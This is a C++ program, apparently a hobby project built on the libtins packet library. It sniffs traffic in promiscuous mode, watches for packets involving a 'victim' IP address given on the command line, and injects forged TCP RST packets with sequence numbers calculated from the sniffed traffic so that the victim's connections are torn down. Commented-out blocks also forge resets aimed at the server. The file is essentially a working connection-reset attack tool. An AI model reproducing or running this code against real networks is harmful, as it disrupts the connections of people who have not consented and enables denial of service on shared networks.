#include <bits/stdint-uintn.h>
#include <tins/ethernetII.h>
#include <stdexcept>
#include <tins/ip_address.h>
#include <tins/ipsec.h>
#include <tins/network_interface.h>
#include <tins/packet_sender.h>
#include <tins/rawpdu.h>
#include <tins/tins.h>
#include <vector>
#include <iostream>
#include <string>
#include "sendpacket.cpp"


using namespace Tins;

bool doo(PDU&) {
	std::cout << "SNIFF " << std::endl;
    return false;
}
int sendPacket(char *srcIP, char *dstIP, int sPort, int dPort, uint32_t seqNum);

struct foo {
	IPv4Address gw, victim;
	PacketSender sender;

	NetworkInterface iface;
	NetworkInterface::Info info;
	EthernetII::address_type victim_hw;
	int sent;

	void bar(IPv4Address gw,
			IPv4Address victim) {
		sent = 0;
		this->gw = gw;
		this->victim = victim;
		// First fetch all network interfaces
		std::vector<NetworkInterface> interfaces = NetworkInterface::all();


		try {
			// Get the interface which will be the gateway for our requests.
			iface = gw;
			// Lookup the interface id. This will be required while forging packets.
			// Find the interface hardware and ip address.
			info = iface.addresses();
		}
		catch (std::runtime_error& ex) {
			std::cout << ex.what() << std::endl;
			return;
		}
		// Resolves victim's hardware address.
		victim_hw = Utils::resolve_hwaddr(iface, victim, sender);

		// Now iterate them
		for (const NetworkInterface& iface : interfaces
			) {
			// First print the name (GUID)
			std::cout << "Interface name: " << iface.name();

			// Now print the friendly name, a wstring that will contain something like 
			// "Local Area Connection 2"
			std::wcout << " (" << iface.friendly_name() << ")" << std::endl;
		}
		SnifferConfiguration config;
		config.set_promisc_mode(true);
		Sniffer sniffer("wlp5s0", config);
		/* Uses the helper function to create a proxy object that
		 * will call this->handle. If you're using boost or C++11,
		 * you could use boost::bind or std::bind, that will also
		 * work.
		 */
		while (true)
			sniffer.sniff_loop(make_sniffer_handler(this, &foo::handle));
	}

	bool handle(PDU& pdu) {
		IPv4Address src = pdu.rfind_pdu<IP>().src_addr();
		IPv4Address dst = pdu.rfind_pdu<IP>().dst_addr();

		TCP tcp = pdu.rfind_pdu<TCP>();
		if (src != victim &&  dst != victim)return false;

		/*
		   Tins::RawPDU::payload_type payload = pdu.rfind_pdu<RawPDU>().payload();
		   std::cout << "Payload : ";
		   for (int i=0; i<pdu.rfind_pdu<RawPDU>().payload_size(); i++){

		   std::cout << payload[i];
		   }
		   std::cout <<std::endl<<std::endl;
		   */


		if (dst != victim){
			/*
			std::cout  << "NOT VICTIM " << std::endl;

			//return false;
			std::cout << "SENDING RST to Server \n";
			IP eth = 
				IP(dst, src) /
				TCP(tcp.dport(), tcp.sport());

			eth.find_pdu<TCP>()->flags(TCP::RST);

			eth.rfind_pdu<TCP>().seq(tcp.seq()); 
			TCP tcpsend = eth.rfind_pdu<TCP>();
			sender.send(eth);
			std::cout << "SEND " <<  tcpsend.seq() << std::endl;
			*/
			return true;
		}

		std::cout << "\n\n\nSNIFF src " <<  pdu.rfind_pdu<IP>().src_addr() << std::endl;
		std::cout << "SNIFF dest " <<  pdu.rfind_pdu<IP>().dst_addr() << std::endl;
		std::cout << "SNIFF ack " <<  tcp.ack_seq() << " seq " << tcp.seq() << std::endl;

		Tins::RawPDU payload = pdu.rfind_pdu<RawPDU>();
		std::cout << "SNIFF len " << payload.payload_size()  << std::endl;
		std::cout << "SENDING RST to CLIENT \n";

		std::string srcStr = src.to_string();
		std::string dstStr = dst.to_string();

		char* srcIP;
		char* dstIP;
		srcIP = &srcStr[0];
		dstIP = &dstStr[0];

		
		sendPacket(srcIP, dstIP, tcp.sport(), tcp.dport(), tcp.seq() + payload.payload_size());
		/*
		IP eth = 
			IP(dst, src) /
			TCP(tcp.dport(), tcp.sport());

		eth.find_pdu<TCP>()->flags(TCP::RST);

		eth.rfind_pdu<TCP>().seq(tcp.seq()  + payload.payload_size());
		TCP tcpsend = eth.rfind_pdu<TCP>();
		sender.send(eth);
		std::cout << "SEND " <<  tcpsend.seq() << std::endl;
		*/
		sent++;


		// Don't process anything
		return true;
	}
};

int main(int argc, char* argv[]) {


    IPv4Address gw, victim;
    EthernetII::address_type own_hw;
    try {
        // Convert dotted-notation ip addresses to integer. 
        gw     = argv[1];
        victim = argv[2];
    }
    catch (...) {
		std::cout << "Invalid ip found...\n";
        return 2;
    }

    foo f;
    f.bar(gw, victim);
}

